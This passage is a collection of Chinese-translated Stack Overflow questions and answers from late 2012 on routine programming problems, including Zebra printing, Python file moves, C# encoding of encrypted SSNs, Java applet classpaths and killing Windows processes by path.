尝试这样的事情

```
function errorAlpha(obj){
    var reg = /^([A-Za-z]+)$/;
    var check = $(obj).val();              

    if(reg.test(check)==true && check.match(reg)==true)
    {
        $(obj).removeClass('error_Aplha');
   }
    else {
        $(obj).addClass('error_Aplha');
   }

 }
 $('#fName').focus().keyup(function(){
        errorAlpha(this);
     }).blur(function(){
            errorAlpha(this);
  }); 
```

# c# - 使用 Zebra 打印机从 Web 应用程序打印客户端

> ID：13524252
> 
> 赞同：0
> 
> 时间：2012-11-23T06:42:45.653
> 
> 标签：c#, asp.net, iis, barcode, zebra-printers

有没有办法（以及那种方式）从 Web 应用程序（IIS、C#）打印到本地连接的（客户端）Zebra 打印机（使用自定义 ZPL 和布局）？

我需要能够打印或多或少的通用数据，所以我不能真正使用普通的打印机屏幕，因为我们使用的布局/ZPL 是定制和自动生成的。

为了在网页和客户端之间建立连接，我需要创建什么？也许是 ActiveX 什么的？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T21:52:44.697

看看 jZebra，这是一个小型的可嵌入 Java 小程序，它有助于打印到标签打印机。小程序完全可以从 JavaScript 控制，并且有很多示例和教程。我在 Zebra GK420t 上使用它，但可以使用任何标签打印机，因为小程序使用原始模式打印。

它是开源的，请在此处查看：[http ://code.google.com/p/jzebra/](http://code.google.com/p/jzebra/)

# 32bit-64bit - InstallShield 从 32 位 exe 升级到 64 位 exe 失败

> ID：13524253
> 
> 赞同：3
> 
> 时间：2012-11-23T06:42:53.213
> 
> 标签：32bit-64bit, installshield, installscript

我正在尝试升级我的项目。我早期的项目有 32 位 exe，现在它使用 64 位 exe。

升级时 ts 给出以下错误：

```
WIN64DUALFOLDERS: Substitution in 
'C:\Program Files (x86)\SHAKESPEARE_INC\Othello\' 
folder had been blocked by the 1 mask argument (the folder pair's 
iSwapAttrib member = 0). 
```

我搜索并找到[了此](http://forum.installsite.net/index.php?showtopic=20624)链接，但找不到问题的解决方案。

有谁知道任何可能的解决方案？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-03-18T11:04:00.833

考虑在部署 exe 的组件中将选项 64 位组件设置为**true**。

# javascript - 在 google.maps.event.addListener() 中只显示街道地址

> ID：13524258
> 
> 赞同：0
> 
> 时间：2012-11-23T06:43:51.647
> 
> 标签：javascript, jquery, google-maps, google-maps-api-3, autocomplete

我编写了一个小函数，它将使用`google.maps.event.addListener()`. 这是[jsFiddle](http://jsfiddle.net/subash1232/K6SWN/1/)。

一切都正是我想要的，除了当用户完成输入并从`street`字段中移出注意力之外，我只想要`input`.

目前它看起来像这样：

![现在](../Images/1330f6eae9c5ed80054b2bfa1c21851d.png)

但我希望它是这样的：

![在此处输入图像描述](../Images/a8a93177753c61b521ca98cd7971fc06.png)

已经感谢您的帮助。干杯。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-23T17:41:10.810

使用短暂的延迟来应用 streetAddress

```
setTimeout(function(){$('#address').val(streetAddress);},50); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-23T21:26:21.863

上述解决方案非常适合自动完成各个地址字段。这是一个带有偏向结果的选项的实现，但是我在使用边界来偏向自动完成字段的结果时遇到了问题。这是我的[jsFiddle](http://jsfiddle.net/jmhGS/22/)。

```
var defaultBounds = new google.maps.LatLngBounds(
    new google.maps.LatLng(33.89028890,-117.5617340),
    new google.maps.LatLng(33.7706850,-117.6639850)
);

var updateAddress = {
    autocomplete: new google.maps.places.Autocomplete($("#address")[0], { 
        bounds: defaultBounds,
        types: ['geocode'],
        componentRestrictions: {country: 'us'}
    }),            
    event: function(){
        var self = this;    
        google.maps.event.addListener(self.autocomplete, 'place_changed', function() {
            var place = self.autocomplete.getPlace(),
                address = place.address_components,
                streetAddress = '',
                suburb = '',
                state = '',
                zip = '',
                country = '';

            for (var i = 0; i < address.length; i++) {
                var addressType = address[i].types[0];

                if (addressType == 'subpremise') {
                    streetAddress += address[i].long_name + '/';
                }
                if (addressType == 'street_number') {
                    streetAddress += address[i].long_name + ' ';
                }
                if (address[i].types[0] == 'route') {
                    streetAddress += address[i].long_name;
                }
                if (addressType == 'locality') {
                    suburb = address[i].long_name;
                }
                if (addressType == 'administrative_area_level_1') {
                    state = address[i].long_name;
                }
                if (addressType == 'postal_code') {
                    zip = address[i].long_name;
                }
                if (addressType == 'country') {
                    country = address[i].long_name;
                }
            }

            // update the textboxes
            setTimeout(function(){$('#address').val(streetAddress);},50);
            $('#suburb').val(suburb);
            $('#state').val(state);
            $('#zip').val(zip);
        });

    }
};

updateAddress.event(); 
```

# python - 如何在 pywebkitgtk 中使用网站图标

> ID：13524261
> 
> 赞同：0
> 
> 时间：2012-11-23T06:44:04.763
> 
> 标签：python, webkit, pygtk

我想为访问的每个网页检索 favicon，并将其放在包含 webkit webview 的笔记本中的选项卡标签旁边。但是，我没有发现有关如何在 pywebkitgtk 中获取图标的信息（一旦我有了图标，我就知道如何放置它）。我在 C 版本的 webkit 中看到了一些用于执行此操作的函数。是否有可能在 python 中或者我应该在 C 中重新开始？如果可能，使用什么功能？谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T04:56:07.533

我知道这是个老问题，但也许这会有所帮助。[http://webkitgtk.org/reference/webkit2gtk/stable/WebKitFaviconDatabase.html](http://webkitgtk.org/reference/webkit2gtk/stable/WebKitFaviconDatabase.html)

# python - Python函数将所有文件和文件夹移动到目标文件夹

> ID：13524262
> 
> 赞同：0
> 
> 时间：2012-11-23T06:44:13.923
> 
> 标签：python, file, directory

我有一个 txt 文件，在其中的每一行中，我都有要隔离到一个地方的文件和文件夹的路径。

该列表在我的 list.txt 文件中是这样的。每个条目都从一个新行开始。

```
 C:\xxx\xxy
 C:\abc\def\ghi.pdf 
```

我的目标文件夹是 c:\users\mr_a\dest

**我想要 ：**

**1.将目录`xxy`及其所有文件和子文件夹移动到`dest`**

**2\. 将`ghi.pdf`文件移动到`dest`.**

对文件中的其他条目执行相同`list.txt`操作。所以我的`dest`目录看起来像：

```
dest\xxy
dest\ghi.pdf 
```

我查看了`shutil`但仍不确定要使用哪个功能。它说该`destination`目录不应该已经存在，但在我的情况下并非如此。我对使用哪种方法感到困惑。还请提及您提到的方法是否安全（我不想要任何令人讨厌的剪切-粘贴，我的文件可能会丢失等）

*我要问的是：使用什么方法来完成我需要在这里做的事情？*

编辑：我使用 Windows，而不是 Linux 或任何 Unix 系统

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T07:04:36.017

```
with open('list.txt') as f:
    for line in f:
        shutil.move(line, dest) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T07:11:46.710

签出`os`和`os.path`。您会发现一些有用的功能，例如：

*   `os.path.exists`- 检查路径是否存在（如您的目标路径）
*   `os.makedirs`- 创建一个目录（包括缺少的父目录）
*   `os.path.isdir`, `os.path.isfile`- 检查路径是否包含目录或文件。
*   `os.path.basename`- 从路径中删除文件名
*   `os.path.join`- 连接路径（或带有文件名的路径）

这是一个代码示例，我没有尝试过：

```
if not os.path.exists(dest):
    os.makedirs(dest)
with open('list.txt', 'r') as f:
    for line in f.readlines():
         filepath = line.strip()
         filename = os.path.basename(filepath)
         shutil.move(filepath, os.path.join(dest, filename)) 
```

# javascript - 使用 javascript 检查图像 url 在 chrome 中不起作用

> ID：13524265
> 
> 赞同：1
> 
> 时间：2012-11-23T06:44:38.453
> 
> 标签：javascript

我正在使用 javascript 检查文件夹中是否存在图像：

```
function checkUrl(url) {
    var request = false;
    if (window.XMLHttpRequest) {
        request = new XMLHttpRequest;
    } else if (window.ActiveXObject) {
        request = new ActiveXObject("Microsoft.XMLHttp");
    }

    if (request) {
        request.open("GET", url);
        if (request.status == 200) { return true; }
    }

    return false;
} 
```

它在 IE、Firefox（Chrome 除外）中运行良好。有谁知道如何用 Chrome 修复它？谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-05-24T14:21:29.830

这是一个同步解决方案。

该函数向服务器发出请求，等待它响应，然后返回结果。

```
function checkUrl(url){
  var request = new XMLHttpRequest()
  request.open("GET", url, false)
  request.send(null)
  if(request.status == 200){
    return true
  }
  return false
} 
```

第二个代码是一个异步解决方案。

该函数向服务器发送请求，无需等待即可返回。当服务器响应时，回调会被调用并返回结果。

```
function checkUrlAsync(url, callback){
  var request = new XMLHttpRequest()
  request.onreadystatechange = function(){
    if(request.readyState != 4) return
    if(request.status == 200){
      callback && callback(true)
    }
    else{
      callback && callback(false)
    }
  }
  request.open("GET", url, true)
  request.send()
} 
```

# google-app-engine - java - 如何在java中的google appengine全文搜索api中轻松地从搜索索引中获取索引词列表？

> ID：13524276
> 
> 赞同：0
> 
> 时间：2012-11-23T06:45:36.403
> 
> 标签：google-app-engine, full-text-search

java - 如何在java中的google appengine全文搜索api中轻松地从搜索索引中获取索引词列表？

我已经向团队添加了一个问题，但是有人可以在当前版本中想到一个简单的方法吗？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T22:06:55.233

API 目前没有办法做到这一点；它不会在任何时候公开标记化的文本，因此如果不编写自己的标记器，就很难弄清楚索引术语是什么。对不起！

# java - 选择我删除的行时行索引超出范围异常

> ID：13524277
> 
> 赞同：1
> 
> 时间：2012-11-23T06:45:47.147
> 
> 标签：java, swing, jtable, row

```
int[] selRows = getNstInclude().getTable().getSelectedRows();

if (selRows.length == 0) 
{
return;
}

int selIndices = getNstInclude().getTable().getSelectedRow();
for (int i = selRows.length - 1; i >= 0; i--)
{
getNstInclude().getTableModel().removeRow(selRows[i]);
}

getNstInclude().getTable().setRowSelectionInterval(selIndices, selIndices); 
```

其中 getNstInclude() 是我的 jtable。

在上面的代码中，我从我的 jtable 中删除一行，然后通过使用我删除该行的相同索引来选择一行，但它显示行索引超出范围异常。有人可以帮我看看我在这里做错了什么吗？提前致谢

# javascript - IE 7 和 IE 8 中的浏览器关闭事件

> ID：13524279
> 
> 赞同：0
> 
> 时间：2012-11-23T06:46:03.693
> 
> 标签：javascript, javascript-events

我知道论坛上有很多关于浏览器关闭事件的帖子。不过还是想发一下。如何始终正确触发 onbeforeunload 事件。如我所见，在某些客户端浏览器中它可以工作，而在某些客户端浏览器中则不能。

当我使用 onbeforeunload 事件时，我曾经收到 IE 警告，说你想运行 ActiveX 脚本。为避免这种情况，我使用了以下代码

```
<!--doctype html>
<!-- saved from url=(0014)about:internet --> 
```

谁能告诉我要使用的标准方法。我需要做的就是当用户关闭浏览器而不单击注销按钮时，我需要更新数据库中的注销字段以获取该用户的登录条目

任何帮助表示赞赏。

谢谢和问候， Sanjai Palliyil

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T07:01:27.773

这不是结束经过身份验证的用户会话的可靠（或安全）方式。

*   如果他们不关闭浏览器怎么办？用户仍处于登录状态，如果其他人使用该浏览器，他们可以使用该会话吗？

*   如果用户打开多个选项卡然后关闭其中一个怎么办？他们
    将被错误地注销。

结束身份验证会话的正确方法是让它在几分钟不活动后过期。在每个新请求上，您都会重置计时器，并且循环服务/流程会独立地结束那些超过活动超时的会话。

# delphi - Delphi TRichEdit 项目符号被格式化为句号

> ID：13524285
> 
> 赞同：-2
> 
> 时间：2012-11-23T06:46:56.750
> 
> 标签：delphi, rtf

当格式化的文本从 MSWord 粘贴到 TRichEdit 控件时，项目符号的格式很好（在显示器上），但之后；

1.  使用 TStringStream 从 TRichEdit 控件中获取 rtf 数据，
2.  将流的 DataString 保存到数据库，然后
3.  将保存的 rtf 字符串加载回 TRichEdit 控件

项目符号被格式化为句号

使用 Delphi 7、Windows xp、msftedit.dll 进行 RichEdit

请协助

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-26T09:26:44.067

经过多次检查，发现问题是由于在保存之前更改了字体引起的，但是我仍然不明白为什么如果将 rtf 设置为 charset = ANSI_Charset 但我更改字体名称时文本会失真到《新罗马时代》

# youtube - 使用 YouTube API 时，我可以将视频存储在自己的服务器中吗？

> ID：13524286
> 
> 赞同：2
> 
> 时间：2012-11-23T06:47:16.893
> 
> 标签：youtube

我们提议将 YouTube API 用于社区视频门户。使用 Upload API 和 Player API 时...我有以下查询...

1.  我可以将所有视频存储在自己的服务器中，而不是存储在 YouTube 上吗？
2.  我网站上上传的视频是否也会自动出现在 youtube.com 上？我可以限制我们的视频在 YouTube 网站上的显示，因为这些视频是通过付费墙进行的吗？
3.  使用 API 上传的视频数量是否有限制？

问候

# c# - 如何让streamwriter在C#的非系统文件夹中创建一个url链接

> ID：13524287
> 
> 赞同：0
> 
> 时间：2012-11-23T06:47:17.523
> 
> 标签：c#, url, shortcuts

我在非系统文件夹中创建 url 链接（快捷方式）时遇到问题。该链接已在桌面上正确创建，没有任何问题，但如果我将路径更改为非系统文件夹，该文件夹仍为空，也没有错误消息。允许的路径有限制吗？为什么没有错误信息？代码如下：

```
private void urlShortcutToFolder(string linkName, string linkUrl)
{
    //string deskDir = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
    //using (StreamWriter writer = new StreamWriter(deskDir + "\\" + linkName + ".url"))
    string nonSystemDir = "C\\Downloads";
    using (StreamWriter writer = new StreamWriter(nonSystemDir + "\\" + linkName + ".url"))
    {
        writer.WriteLine("[InternetShortcut]");
        writer.WriteLine("URL=" + linkUrl);
        writer.Flush();
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T06:59:06.203

如果您在本地运行您的应用程序，那么您的代码是正确的。它必须工作。如果您的应用程序在线运行，那么您必须在要保存 url 的文件夹上为 Internet 用户设置权限。

希望这能解决你的问题

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T07:00:10.723

据我所知，这没有正确的路径：

```
string nonSystemDir = "C\\Downloads"; 
```

难道不应该

```
string nonSystemDir = "C:\\Downloads"; 
```

或更具可读性

```
string nonSystemDir = @"C:\Downloads"; 
```

您也可以像这样添加 System.IO.Directory.Exists

```
private void urlShortcutToFolder(string linkName, string linkUrl)
{
    //string deskDir = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
    //using (StreamWriter writer = new StreamWriter(deskDir + "\\" + linkName + ".url"))
    string nonSystemDir = @"C:\Downloads";
    if(!System.IO.Directory.Exists(nonSystemDir))
    {
        throw New Exception("Path " + nonSystemDir + " is not valid");
    }
    using (StreamWriter writer = new StreamWriter(nonSystemDir + "\\" + linkName + ".url"))
    {
        writer.WriteLine("[InternetShortcut]");
        writer.WriteLine("URL=" + linkUrl);
        writer.Flush();
    }
} 
```

# c# - 从加密值转换时出错

> ID：13524289
> 
> 赞同：0
> 
> 时间：2012-11-23T06:47:34.427
> 
> 标签：c#, .net, encryption, cryptography

我有一个加密方法 GetDecryptedSSN()。我通过以下测试测试了它的正确性。它工作正常

```
 //////////TEST 2//////////
        byte[] encryptedByteWithIBMEncoding2 = DecryptionServiceHelper.GetEncryptedSSN("123456789");
        string clearTextSSN2 = DecryptionServiceHelper.GetDecryptedSSN(encryptedByteWithIBMEncoding2); 
```

但是当我转换为 ASCII 字符串然后返回时，它无法正常工作。转换逻辑有什么问题？

```
 //////////TEST 1////////// 
        //String  -- > ASCII Byte --> IBM Byte -- > encryptedByteWithIBMEncoding
        byte[] encryptedByteWithIBMEncoding = DecryptionServiceHelper.GetEncryptedSSN("123456789");

        //encryptedByteWithIBMEncoding -->  Encrypted Byte ASCII
        string EncodingFormat = "IBM037";
        byte[] encryptedByteWithASCIIEncoding = Encoding.Convert(Encoding.GetEncoding(EncodingFormat), Encoding.ASCII,
                encryptedByteWithIBMEncoding);

        //Encrypted Byte ASCII - ASCII Encoded string 
        string encodedEncryptedStringInASCII = System.Text.ASCIIEncoding.ASCII.GetString(encryptedByteWithASCIIEncoding);
        //UpdateSSN(encodedEncryptedStringInASCII);

        byte[] dataInBytesASCII = System.Text.ASCIIEncoding.ASCII.GetBytes(encodedEncryptedStringInASCII);
        byte[] bytesInIBM = Encoding.Convert(Encoding.ASCII, Encoding.GetEncoding(EncodingFormat),
                dataInBytesASCII);
        string clearTextSSN = DecryptionServiceHelper.GetDecryptedSSN(bytesInIBM); 
```

**助手类**

```
 public static class DecryptionServiceHelper
{
    public const string EncodingFormat = "IBM037";
    public const string SSNPrefix = "0000000";
    public const string Encryption = "E";
    public const string Decryption = "D";

    public static byte[] GetEncryptedSSN(string clearTextSSN)
    {
        return GetEncryptedID(SSNPrefix + clearTextSSN);
    }

    public static string GetDecryptedSSN(byte[] encryptedSSN)
    {
        return GetDecryptedID(encryptedSSN);
    }

    private static byte[] GetEncryptedID(string id)
    {
        ServiceProgram input = new ServiceProgram();
        input.RequestText = Encodeto64(id);
        input.RequestType = Encryption;

        ProgramInterface inputRequest = new ProgramInterface();
        inputRequest.Test__Request = input;

        using (MY_Service operation = new MY_Service())
        {
            return ((operation.MY_Operation(inputRequest)).Test__Response.ResponseText);
        }
    }

    private static string GetDecryptedID(byte[] id)
    {
        ServiceProgram input = new ServiceProgram();
        input.RequestText = id;
        input.RequestType = Decryption;

        ProgramInterface request = new ProgramInterface();
        request.Test__Request = input;

        using (MY_Service operationD = new MY_Service())
        {
            ProgramInterface1 response = operationD.MY_Operation(request);
            byte[] encodedBytes = Encoding.Convert(Encoding.GetEncoding(EncodingFormat), Encoding.ASCII,
                response.Test__Response.ResponseText);

            return System.Text.ASCIIEncoding.ASCII.GetString(encodedBytes);
        }
    }

    private static byte[] Encodeto64(string toEncode)
    {
        byte[] dataInBytes = System.Text.ASCIIEncoding.ASCII.GetBytes(toEncode);
        Encoding encoding = Encoding.GetEncoding(EncodingFormat);
        return Encoding.Convert(Encoding.ASCII, encoding, dataInBytes);
    }

} 
```

**参考**：

1.  [使用 AesCryptoServiceProvider 获取不正确的解密值](https://stackoverflow.com/questions/14937707/getting-incorrect-decryption-value-using-aescryptoserviceprovider)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T07:08:21.610

这就是问题所在，我怀疑：

```
string encodedEncryptedStringInASCII = 
    System.Text.ASCIIEncoding.ASCII.GetString(encryptedByteWithASCIIEncoding); 
```

（由于事先所有的编码都搞乱了，这并不完全清楚，这对我来说似乎毫无意义，但是......）

加密的结果*不是*“用 ASCII 编码的文本”——所以你不应该试图那样对待它。（您还没有说您使用的是哪种加密，但它会产生 ASCII 文本会*很*奇怪。）

它只是一个任意字节数组。为了在文本中仅使用 ASCII 字符集来表示，最常见的方法是使用 base64。所以上面的代码会变成：

```
string encryptedText = Convert.ToBase64(encryptedByteWithIBMEncoding); 
```

然后，您将其转换回一个字节数组，准备好解密，如下所示：

```
encryptedByteWithIBMEncoding = Convert.FromBase64String(encryptedText); 
```

如果您能提供帮助，我*强烈*建议您避免使用这样的编码。目前还不清楚为什么 ASCII 需要参与进来*。*如果您*真的*想在加密之前将原始文本编码为 IBM037，您应该只使用：

```
Encoding encoding = Encoding.GetEncoding("IBM037");
string unencryptedBinary = encoding.GetBytes(textInput); 
```

就我个人而言，我通常使用 UTF-8 作为一种编码，它可以处理任何字符数据，而不仅仅是一个有限的子集，但这取决于你。我认为你让整个事情变得比它需要的复杂得多。

一个典型的“加密一个字符串，得到一个字符串结果”的工作流程是：

1.  使用 UTF-8 将输入文本转换为字节。结果是一个字节数组。
2.  加密步骤 1 的结果。结果是一个字节数组。
3.  将步骤 2 的结果转换为 base64。结果是一个字符串。

解密：

1.  *从*base64转换字符串。结果是一个字节数组。
2.  解密步骤1的结果。结果是一个字节数组。
3.  使用与加密过程的步骤 1 相同的编码将步骤 2 的结果转换回字符串。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T07:00:28.337

在 DecryptionServiceHelper.GetEncryptedSSN 中，您在加密之前以 IBM037 格式对文本进行编码。

因此，以下代码不正确，因为您将加密字节转换为 ASCII，假设它采用 IBM037 格式。这是错误的，因为加密的字节不是 IBM037 格式（文本是在加密之前编码的）

```
//encryptedByteWithIBMEncoding -->  Encrypted Byte ASCII
string EncodingFormat = "IBM037";
byte[] encryptedByteWithASCIIEncoding = Encoding.Convert(Encoding.GetEncoding(EncodingFormat), Encoding.ASCII,
        encryptedByteWithIBMEncoding); 
```

一种可能的解决方案是使用 IBM037 格式对加密文本进行编码，这应该可以解决我猜的问题。

# php - 如何使用 PHP 邮件程序脚本获取电子邮件标头中的密件抄送信息

> ID：13524292
> 
> 赞同：5
> 
> 时间：2012-11-23T06:47:38.207
> 
> 标签：php

我正在使用 php mailer 脚本在我的项目中发送电子邮件。当我使用以下代码通过密件抄送发送邮件时

```
$mail->AddBCC(test@test.com) 
```

test@test.com 用户收到的邮件，但邮件标题中显示的信息内容未显示如下密件抄送信息。

```
Bcc: test@test.com 
```

我怎样才能实现它。提前致谢。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-23T06:49:36.940

BCC 信息由 SMTP 服务器自动从 BCC 移动到 RCPT 字段。您不会在收件人邮箱中看到密件抄送字段。

你会在这里找到一个类似问题的好答案：[https ://stackoverflow.com/a/2750359/239599](https://stackoverflow.com/a/2750359/239599)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2021-10-07T08:13:41.507

如果您使用 mailhog，请单击`Show headers`您将看到的`cc`和`bcc`

[![在此处输入图像描述](../Images/bf067271dc3b77c1697e9836594837e4.png)](https://i.stack.imgur.com/Tcqwl.png)

# java - JApplet NoClassDefFoundError

> ID：13524293
> 
> 赞同：0
> 
> 时间：2012-11-23T06:47:41.907
> 
> 标签：java, applet, noclassdeffounderror

我在 Eclipse 上写了一个 Japplet，时不时地，它停止在 html 页面上工作。

以下是错误：

```
 Exception in thread "thread applet-main.MapGenerator.class-1" java.lang.NoClassDefFoundError: com/google/gson/Gson
at main.Floor.parse(Floor.java:39)
at main.MapGenerator.loadParameters(MapGenerator.java:64)
at main.MapGenerator.start(MapGenerator.java:28)
at sun.plugin2.applet.Plugin2Manager$AppletExecutionRunnable.run(Plugin2Manager.java:1698)
at java.lang.Thread.run(Thread.java:662)

  Caused by: java.lang.ClassNotFoundException: com.google.gson.Gson
at sun.plugin2.applet.Applet2ClassLoader.findClass(Applet2ClassLoader.java:252)
at sun.plugin2.applet.Plugin2ClassLoader.loadClass0(Plugin2ClassLoader.java:250)
at sun.plugin2.applet.Plugin2ClassLoader.loadClass(Plugin2ClassLoader.java:180)
at sun.plugin2.applet.Plugin2ClassLoader.loadClass(Plugin2ClassLoader.java:161)
at java.lang.ClassLoader.loadClass(ClassLoader.java:247)
... 5 more 
```

这里也是服务器请求：

```
 "GET /static/java/MapGenerator.jar HTTP/1.1" 200 68177
  "GET /static/java/com/google/gson/Gson.class HTTP/1.1" 404 1697 
```

关键是它试图在服务器内部而不是它的包中找到 Gson 库......我不知道如何解决这个问题。

如果您需要什么，请随意询问。

**编辑**

我已经在 eclipse 的项目中导入了 Gson 的库。实际上我不知道为什么小程序试图从服务器加载它......在 Eclipse 上它运行没有任何问题。

**编辑**

我已经物理复制了eclipse项目中的库......它仍然试图从服务器获取它们......我不知道还能做什么......

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T06:55:56.203

第一件事你没有在你的类路径中添加[gson](http://code.google.com/p/google-gson/)库，第二件事你的 request( `GET /static/java/com/google/gson/Gson.class HTTP/1.1`) 是错误的。

如果你有 gson jar ，你可以`/static/java`像你一样`MapGenerator.jar`请求 gson jar `MapGenerator.jar`。但是您不能请求从该 jar 中获取课程。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T11:07:30.340

显然没有人告诉我我不能将一个 Jar 插入另一个 Jar 中，并希望一切正常。

所以我把我的 JAR 库放在 applet 的同一个文件夹中，并以这种方式加载 applet：

```
 <applet name="mapGenerator"
            id="mapGenerator"  
            code="main.MapGenerator.class"
            archive="{{STATIC_URL}}java/MapGenerator.jar, 
                            {{STATIC_URL}}java/gson-2.2.2.jar,
                            {{STATIC_URL}}java/plugin.jar"
                     >
                    <param name=id value="{{building.id}}">
                    <param name=piani value='{{floors}}'>  
            MAYSCRIPT
    </applet> 
```

# iphone - 如何在第二个 ViewController 上使用 UIPickerView

> ID：13524294
> 
> 赞同：0
> 
> 时间：2012-11-23T06:47:48.397
> 
> 标签：iphone, uipickerview

“我正在为 iPhone 创建一个应用程序，我必须在其中创建一个登录页面。从服务器获得响应后..它将导航用户到下一个视图。在下一个视图中，我使用 UIPickerView。但它不工作.. 因为我只知道如何在单个应用程序中使用它。但我不知道如何在应用程序的第二个 ViewController 中使用它？？”

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T07:26:56.897

你可以使用这个 getPicker

```
-(void)getValuePicker
{
    ViewForValuePicker = [[UIView alloc]initWithFrame:CGRectMake(0, 219, 320, 266)];

    UIToolbar *toolBar = [[UIToolbar alloc]initWithFrame:CGRectMake(0, 0, 320, 44)];
    toolBar.barStyle = UIBarStyleBlackOpaque;

    UIBarButtonItem *btn = [[UIBarButtonItem alloc] initWithBarButtonSystemItem:UIBarButtonSystemItemDone target:self action:@selector(doneBtnPressToGetValue)];

    [toolBar setItems:[NSArray arrayWithObject:btn]];
    [ViewForValuePicker addSubview:toolBar];

    valuePicker = [[UIPickerView alloc] initWithFrame:CGRectMake(0, 44, 320, 216)];
    valuePicker.delegate=self;
    valuePicker.dataSource=self;
    valuePicker.showsSelectionIndicator=YES;

    [ViewForValuePicker addSubview:valuePicker];

    [appDelegate.window addSubview:ViewForValuePicker];
} 
```

及其委托方法

```
-(NSInteger)numberOfComponentsInPickerView:(UIPickerView *)pickerView
{
    return 1;
}

- (NSInteger)pickerView:(UIPickerView *)pickerView numberOfRowsInComponent:(NSInteger)component;
{
    return [pickerValueAry count];
}

- (NSString *)pickerView:(UIPickerView *)pickerView titleForRow:(NSInteger)row forComponent:(NSInteger)component;
{
    NSMutableArray *ary = [[NSMutableArray alloc] initWithArray:pickerValueAry];
    id str=[ary objectAtIndex:row];
    return str;
}

- (void)pickerView:(UIPickerView *)pickerView didSelectRow:(NSInteger)row inComponent:(NSInteger)component
{    
    NSLog(@"selectedRowInPicker >> %d",row);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T06:54:10.147

```
in .h file  this method

 UIViewController<UIPickerViewDataSource,UIPickerViewDelegate>

{

    IBOutlet UIPickerView *picker;
     NSMutableArray *pickerArrayType;
}

//in .m file

- (void)viewDidLoad
{
    [super viewDidLoad];
pickerArrayType = [[NSMutableArray alloc] initWithObjects:@"Type 1",@"Type 2",@"Type 3",@"Type 4",@"Type 5", nil]
}

# pragma mark - picker Methods
- (NSInteger)numberOfComponentsInPickerView:(UIPickerView *)pickerView;
{
    return 1;
}

- (void)pickerView:(UIPickerView *)pickerView1 didSelectRow:(NSInteger)row inComponent:(NSInteger)component
{

 lbl.text = [pickerArrayType objectAtIndex:row];

}

- (NSInteger)pickerView:(UIPickerView *)pickerView numberOfRowsInComponent:(NSInteger)component;
{
  return [pickerArrayType count];
}

- (NSString *)pickerView:(UIPickerView *)pickerView titleForRow:(NSInteger)row forComponent:(NSInteger)component;
{
    return [pickerArrayType objectAtIndex:row];
} 
```

# excel - 向单元格引用添加值

> ID：13524302
> 
> 赞同：0
> 
> 时间：2012-11-23T06:48:40.997
> 
> 标签：excel, excel-formula

我在一个 Excel 文件中有多个工作表

`sheet1` 包含一些数据来自`A1 to A100`

`sheet2` 在这张表`row1`中包含带有数值的数据

在`sheet2`如果`A1`包含 0`A3`应该是的`A1`值`sheet1`

`sheet2`如果`A1`包含 30`A3`应该是that`A1+30`的`A31`值`sheet1`

知道如何获得所描述的行为吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T06:59:25.897

听起来您正在寻找涉及`INDIRECT`. 不确定您的数据是什么样的，但从它的声音来看，您可能希望将这样的公式`A3`放入`Sheet2`：

```
=INDIRECT("Sheet1!A" & A1 + 1) 
```

这将获得 中的值`A1`，添加 1 (0->1, 30->31)，然后将其与`Sheet1!A`字符串连接，为您提供对第一张纸上单元格的引用。然后使用`INDIRECT`返回该单元格的值。

# windows - taskkill 按路径区分 2 个图像

> ID：13524303
> 
> 赞同：16
> 
> 时间：2012-11-23T06:48:47.097
> 
> 标签：windows, windows-shell

如何使用 taskkill 按名称杀死进程并从特定路径发起？

taskkill /F /IM

当然它不能区分从两个不同位置 C:\Dir1 和 C:\Dir2 开始的 2 个进程

tasklist 是否有任何开关来获取路径名

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-11-23T06:52:02.077

`taskkill`做不到。但是如果可以的话，你可以使用 PowerShell：

```
(Get-WmiObject Win32_Process | Where-Object { $_.Path.StartsWith('C:\Dir1') }).Terminate() 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-11-22T17:59:58.020

根据乔伊的回答：

```
wmic Path win32_process Where "CommandLine Like '%C:\\Dir1\\image.exe%'" Call Terminate 
```

这样，当 Path 为空（不知道为什么）并且不需要 PowerShell 时，我可以避免 NullReferenceException。

参考：[https ://superuser.com/questions/52159/kill-a-process-with-a-specific-command-line-from-command-line](https://superuser.com/questions/52159/kill-a-process-with-a-specific-command-line-from-command-line)

* * *

**警告**

如果命令行运行的其他进程包含该图像路径，则很危险。例如：

```
> start cmd /k "C:\windows\system32\notepad.exe"

> wmic Path win32_process where "CommandLine Like '%C:\\Windows\\system32\\notepad.exe%'" get caption,processid,executablePath,commandline
Caption      CommandLine                                ExecutablePath                   ProcessId
cmd.exe      cmd  /k "C:\windows\system32\notepad.exe"  C:\WINDOWS\system32\cmd.exe      11384
notepad.exe  C:\windows\system32\notepad.exe            C:\windows\system32\notepad.exe  9684 
```

那么......如果我们使用“C:\Dir1\image.exe%”而不是“%C:\Dir1\image.exe%”呢？

如果我们从 Explorer 启动这个程序，它的命令行*可能会*被引用。如果我们忽略它，将没有匹配项：

```
